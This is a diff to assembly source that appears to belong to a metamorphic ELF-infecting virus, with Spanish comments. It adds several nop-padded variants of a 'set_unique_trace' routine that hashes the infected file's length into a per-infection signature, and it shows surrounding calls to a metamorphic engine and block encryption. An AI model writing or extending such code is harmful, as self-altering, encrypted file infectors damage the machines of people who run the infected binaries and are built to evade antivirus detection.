@@ -205,6 +205,9 @@ section .text
         ; sobre q binarios distintos, la firma sea la misma. En este caso, sí será
         ; la misma en caso de que ifectemos con el mismo binario el mismo objetivo.
         ; Pero esa es la gracia, creo. Si no, sería random.
+        nop
+        nop
+        nop
         mov rcx, VAR(Death.file_final_len)
         add rax, rcx
 
@@ -260,6 +263,7 @@ section .text
         add rsp, 8
         ret
     __F_set_unique_trace__end:
+    F_set_unique_trace_len equ $ - __F_set_unique_trace
 
 
     __F_mod_sh_note:
@@ -300,7 +304,7 @@ section .text
         ; multiplicamos dl * F_crazy_len
         movzx rbx, dl
         xor edx, edx
-        mov rax, F_crazy_len
+        mov rax, rcx
         mul rbx
 
         ; en rax tendemos dl * F_crazy_len
@@ -777,6 +781,7 @@ section .text
 	.mod_functions:
         CALL_METAMORPH(crazy, 7)
         CALL_METAMORPH(mod_pt_note, 2)
+        ;CALL_METAMORPH(set_unique_trace, 3)
 
     .encrypt_data_block:
         CALL_ENCRYPT(encrypt_block) ; encripta
@@ -1107,5 +1112,162 @@ section .text
         nop
         ret
     __F_mod_pt_note_1__end:
+
+    __F_set_unique_trace_0:
+        nop
+        nop
+        mov rcx, VAR(Death.file_final_len)
+        add rax, rcx
+
+        mov rcx, rax
+        shl rcx, 13
+        xor rax, rcx
+
+        mov rcx, rax
+        shr rcx, 17
+        xor rax, rcx
+
+        mov rcx, rax
+        shl rcx, 5
+        xor rax, rcx
+
+        and rax, 0x3FFFFFF
+
+        lea rdi, [rel Traza]
+        add rdi, Traza_len + 1
+        add rdi, 8
+
+        xor rcx, rcx
+        sub rsp, 8
+        lea rsi, [rsp+7]
+
+        mov rcx, 8
+        mov rbx, 10
+        .convert_loop:
+            xor rdx, rdx
+            div rbx       ; rax / rbx. rdx = resto.
+
+            add dl, '0'
+            mov [rsi], dl
+            dec rsi
+            dec rcx
+            jnz .convert_loop
+
+        lea rsi, [rsp]
+        lea rdi, [rel Traza]
+        add rdi, Traza_len + 1
+        mov rcx, 8
+        cld
+        rep movsb
+
+        add rsp, 8
+        nop
+        ret
+    __F_set_unique_trace_0__end:
+
+    __F_set_unique_trace_1:
+        nop
+        mov rcx, VAR(Death.file_final_len)
+        add rax, rcx
+
+        mov rcx, rax
+        shl rcx, 13
+        xor rax, rcx
+
+        mov rcx, rax
+        shr rcx, 17
+        xor rax, rcx
+
+        mov rcx, rax
+        shl rcx, 5
+        xor rax, rcx
+
+        and rax, 0x3FFFFFF
+
+        lea rdi, [rel Traza]
+        add rdi, Traza_len + 1
+        add rdi, 8
+
+        xor rcx, rcx
+        sub rsp, 8
+        lea rsi, [rsp+7]
+
+        mov rcx, 8
+        mov rbx, 10
+        .convert_loop:
+            xor rdx, rdx
+            div rbx       ; rax / rbx. rdx = resto.
+
+            add dl, '0'
+            mov [rsi], dl
+            dec rsi
+            dec rcx
+            jnz .convert_loop
+
+        lea rsi, [rsp]
+        lea rdi, [rel Traza]
+        add rdi, Traza_len + 1
+        mov rcx, 8
+        cld
+        rep movsb
+
+        add rsp, 8
+        nop
+        nop
+        ret
+    __F_set_unique_trace_1__end:
+
+    __F_set_unique_trace_2:
+
+        mov rcx, VAR(Death.file_final_len)
+        add rax, rcx
+
+        mov rcx, rax
+        shl rcx, 13
+        xor rax, rcx
+
+        mov rcx, rax
+        shr rcx, 17
+        xor rax, rcx
+
+        mov rcx, rax
+        shl rcx, 5
+        xor rax, rcx
+
+        and rax, 0x3FFFFFF
+
+        lea rdi, [rel Traza]
+        add rdi, Traza_len + 1
+        add rdi, 8
+
+        xor rcx, rcx
+        sub rsp, 8
+        lea rsi, [rsp+7]
+
+        mov rcx, 8
+        mov rbx, 10
+        .convert_loop:
+            xor rdx, rdx
+            div rbx       ; rax / rbx. rdx = resto.
+
+            add dl, '0'
+            mov [rsi], dl
+            dec rsi
+            dec rcx
+            jnz .convert_loop
+
+        lea rsi, [rsp]
+        lea rdi, [rel Traza]
+        add rdi, Traza_len + 1
+        mov rcx, 8
+        cld
+        rep movsb
+
+        add rsp, 8
+        nop
+        nop
+        nop
+        ret
+    __F_set_unique_trace_2__end:
 
     _finish:
